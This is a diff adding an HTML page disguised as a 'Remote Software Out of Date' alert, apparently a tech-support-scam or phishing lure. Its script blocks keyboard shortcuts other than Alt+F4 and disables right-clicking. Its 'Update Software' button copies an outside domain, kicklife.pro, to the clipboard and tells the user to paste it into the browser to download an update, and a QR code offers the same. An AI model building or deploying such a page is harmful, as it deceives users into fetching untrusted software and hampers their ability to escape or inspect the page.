@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Remote Software Alert</title>
+    <link rel="stylesheet" type="text/css" href="styles.css">
+</head>
+<body>
+  <div class="alert-container">
+    <img src="Warning Sign.png" alt="Alert!" class="alert-picture left">
+    <h1 class="alert-heading">Remote Software Out of Date</h1>
+</div>
+    <p class="alert-text">The software you are using is out of date. Keeping our remote connection software up to date is crucial to provide users with improved functionality, enhanced security, and compatibility with evolving technology. Regular updates ensure that our software remains a reliable and competitive solution, meeting the changing needs of our customers while protecting their data from emerging threats. It also allows us to maintain a strong position in the market by staying ahead of the competition and delivering a superior user experience.</p>
+    <button id="copyButton" onclick="copyToClipboard()">Update Software</button>
+</body>
+<body>
+  <p class="qr-text">Button doesn't work? Scan QR Code below to update!</p>
+  <img src="qr-code.png" alt="Download Update to Software" class="qr-picture">
+
+  <script>
+    // Disable keyboard shortcuts except Alt+F4
+    document.addEventListener("keydown", function(event) {
+      if (!(event.altKey && event.code === "F4")) {
+        event.preventDefault();
+      }
+    });
+
+    // Disable right-clicking
+    document.addEventListener("contextmenu", function(event) {
+      event.preventDefault();
+    });
+
+    function copyToClipboard() {
+      var link = "kicklife.pro";
+      var tempInput = document.createElement("input");
+      tempInput.setAttribute("value", link);
+      document.body.appendChild(tempInput);
+      tempInput.select()
+;
+      document.execCommand("copy");
+      document.body.removeChild(tempInput);
+      alert("Paste text in your browser to download update.");
+    }
+  </script>
